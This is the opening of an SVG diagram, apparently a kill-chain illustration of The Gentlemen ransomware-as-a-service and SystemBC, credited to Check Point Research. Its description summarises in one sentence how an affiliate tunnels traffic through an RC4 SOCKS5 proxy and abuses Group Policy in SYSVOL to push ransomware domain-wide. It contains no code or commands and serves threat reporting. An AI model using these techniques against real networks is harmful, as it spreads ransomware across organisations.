<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 1080" role="img" aria-labelledby="t d">
  <title id="t">The Gentlemen RaaS + SystemBC kill chain — Check Point Research, April 2026</title>
  <desc id="d">The Gentlemen affiliate uses SystemBC's custom RC4 SOCKS5 proxy to tunnel post-foothold activity, then weaponises Group Policy in SYSVOL to deploy the ransomware payload simultaneously across the entire AD domain.</desc>
  <defs>
